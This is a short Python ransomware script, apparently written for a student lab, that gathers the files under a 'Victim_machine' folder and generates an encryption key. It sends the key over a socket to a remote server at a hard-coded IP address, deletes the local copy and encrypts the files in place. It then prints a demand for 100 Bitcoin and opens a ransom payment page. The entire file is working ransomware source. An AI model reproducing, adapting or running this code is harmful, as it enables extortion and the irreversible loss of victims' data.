#!/usr/bin/env python3

import socket
import os
from cryptography.fernet import Fernet
import webbrowser
import time

#finding all the files and subfolders in current directory
files = []

for root, dirs, file in os.walk('/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/'):
	print(file,'\n')
	print(dirs,'\n')
	print(root,'\n')
	for filename in file:
		if filename == "defender.py" or filename == "symkey.key" or filename == "wannasmile.py":
			continue
		filepath = os.path.join(root, filename)
		files.append(filepath)

print(files)

#Socket information
IP_ADDRESS = '10.125.220.246'
PORT = 68
hostname = socket.gethostname()

key = Fernet.generate_key()
print(key)
with open("/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/symkey.key", "wb") as thekey:
	thekey.write(key)

#Connect to server to transfer key and hostname
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((IP_ADDRESS, PORT))
	print('Successfully connected...transmitting key')
	s.send(f'{key}'.encode('utf-8'))
	print('Finished transmitting the key!!!')
	os.remove('/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/symkey.key')
	s.close()

#Writing the files with the encrypted text using the key
for file in files:
	with open(file, "rb") as thefile:
		print(f'The file {file} opened')
		contents = thefile.read()
		print(f'The file {file} reading is done')
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
	time.sleep(5)

print("All of your files have been encrypted!! Send me 100 Bitcoin or I will delete them in 24 hours!!!")

webbrowser.open("file:///media/sf_Ransomware_Group8/Infection/payRansomware.html")
